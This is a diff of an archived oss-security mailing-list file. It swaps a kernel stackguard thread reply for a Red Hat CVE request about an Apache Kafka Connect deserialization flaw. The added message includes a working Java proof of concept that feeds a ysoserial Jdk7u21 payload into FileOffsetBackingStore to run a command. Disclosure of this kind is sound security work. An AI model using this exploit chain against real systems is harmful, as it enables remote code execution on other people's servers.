@@ -1,39 +1,76 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/22/12
-Message-ID: <20170622162341.GC11634@u40b0340c692b58f6553c.ant.amazon.com>
-Date: Thu, 22 Jun 2017 09:23:41 -0700
-From: Eduardo Valentin <eduval@...zon.com>
-To: <oss-security@...ts.openwall.com>
-CC: Vasily Averin <vvs@...tuozzo.com>, Konstantin Khorenko <khorenko@...tuozzo.com>
-Subject: Re: stackguard fix in Red Hat and Ubuntu kernels
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/19/1
+Message-ID: <CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>
+Date: Wed, 19 Jul 2017 09:41:16 +1000
+From: Hooman Ghasem Broujerdi <hghasemb@...hat.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-IDs request for Apache Kafka desrialization vulnerability via runtime
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Jun 22, 2017 at 09:38:13PM +0800, Greg KH wrote:
-> On Thu, Jun 22, 2017 at 02:18:33PM +0200, Marcus Meissner wrote:
-> > Hi,
-> > 
-> > Yes, we at SUSE are seeing similar crashes. Thanks for the reproducer!
-> 
-> The patches upstream in Linus's tree should resolve these crashes,
-> correct?  If not, please let the kernel developers know, as we ended up
+Hi,
 
-We could not repro the segv with the upstream version at our end. So, I think upstream is fine for this case.
+Apache kafka connect-api runtime contains a desrialization vul via
+FileOffsetBackingStore
+which leads to remote code execution, this can be exploited reliably in
+JDK1.7.0_05, below is
+a unit test for it:
 
-> going with a different set of changes than the distros shipped, and are
 
-Just to my understanding, do you know why we ended up having a version for linux-distro and another for upstream?
+import junit.framework.Test;
+import junit.framework.TestCase;
+import junit.framework.TestSuite;
+import org.apache.commons.io.FileUtils;
+import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
+import org.apache.kafka.connect.storage.FileOffsetBackingStore;
+import ysoserial.payloads.Jdk7u21;
 
-> still working on getting these backported to older stable kernels at the
-> moment.
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.util.HashMap;
+import java.util.Map;
 
-Thanks!!
+public void test_Kafka_Deser() throws Exception {
 
-> 
-> thanks,
-> 
-> greg k-h
-> 
+        StandaloneConfig config;
 
--- 
-All the best,
-Eduardo Valentin
+        String projectDir = System.getProperty("user.dir");
+
+        Jdk7u21 jdk7u21 = new Jdk7u21();
+        Object o = jdk7u21.getObject("touch vul");
+
+        byte[] ser = serialize(o);
+
+        File tempFile = new File(projectDir + "/payload.ser");
+        FileUtils.writeByteArrayToFile(tempFile, ser);
+
+        Map<String, String> props = new HashMap<String, String>();
+        props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG,
+tempFile.getAbsolutePath());
+        props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        config = new StandaloneConfig(props);
+
+        FileOffsetBackingStore restore = new FileOffsetBackingStore();
+        restore.configure(config);
+        restore.start();
+    }
+
+    private byte[] serialize(Object object) throws IOException {
+        ByteArrayOutputStream bout = new ByteArrayOutputStream();
+        ObjectOutputStream out = new ObjectOutputStream(bout);
+        out.writeObject(object);
+        out.flush();
+        return bout.toByteArray();
+    }
+
+Thanks,
+Hooman Broujerdi / Red Hat Product Security
+
